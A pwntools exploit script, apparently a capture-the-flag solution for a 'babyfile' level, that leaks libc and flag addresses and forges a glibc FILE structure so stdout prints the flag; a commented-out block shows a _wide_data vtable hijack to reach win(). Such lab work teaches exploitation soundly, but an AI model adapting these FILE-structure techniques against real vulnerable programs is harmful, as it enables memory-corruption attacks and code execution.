# idea: puts(flag_loc). wide_data can be put in .bss
# overwrite stdout fp

from pwn import *

context.arch = 'amd64'

p = process("/challenge/babyfile_level16", stdout=PTY, stderr=PTY)
#p = gdb.debug("/challenge/babyfile_level14")
binary = ELF("/challenge/babyfile_level16")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# flag loc leak
p.recvuntil(b"is located at ")
flag_loc = int(p.recvuntil(b'\n')[:-1], 16)
print(f'flag_loc = {hex(flag_loc)}')

# libc addr leak
p.recvuntil(b"[LEAK]")
p.recvuntil(b": ")
puts_leak = int(p.recvuntil(b'\n')[:-1], 16)
libc_base = puts_leak - libc.sym['puts']
libc.address = libc_base
print(f'puts_leak = {hex(puts_leak)}')
'''
bss_end = binary.bss() + binary.get_section_by_name('.bss').data_size
buf = bss_end - 0x10 - 0xe0 # place to put wide_data
'''
# puts vtable and wide_data into bss
p.sendline(b'open_file')
p.sendline(b'write_fp')
p.recv()

fs = FileStructure()
fs.flags = 0x800
fs._IO_read_end = flag_loc
fs._IO_write_base = flag_loc
fs._IO_write_ptr = flag_loc + 0x50
fs._IO_write_end = flag_loc +0x50
fs._IO_buf_end = flag_loc + 0x50
fs.fileno = 2
payload = bytes(fs)[:0x74]
p.send(payload)
p.recv()

p.sendline(b'close_file')
p.interactive()
'''
p.recv()
payload = p64(0x00) * 0x68 + p64(puts_leak)
p.send()


# write wide_data to stack_leak + 0x1e0 : somewhere on stack that won't affect execution until ret to main
_wide_vtable_offset = 0xe0
doallocbuf_call_offset = 0x68

p.sendline(b'open_file')
p.sendline(b'write_fp')
buf = stack_leak + 0x1e0

_wide_data_vtable = (p64(buf + 0x8) + b"\x00" * doallocbuf_call_offset + p64(binary_base + binary.sym['win']))

fs = FileStructure()
payload = fs.read(buf, (0x8 + doallocbuf_call_offset + 0x8))
p.send(payload)
p.sendline(b'read_file')
p.sendline(b'1')
p.recv()
p.send(_wide_data_vtable)

# wide_data trick to win()
p.sendline(b"open_file")
p.sendline(b'write_fp')

fs = FileStructure()
fs.vtable = libc.sym['_IO_wfile_jumps'] + 24 - 0x10 # fwrite calling vtable + 0x3
fs._lock = buf + 0xe0
fs._wide_data = buf - 0xe0
payload = bytes(fs)

p.send(payload)
p.recv()

p.sendline(b'close_file')

p.interactive()
'''
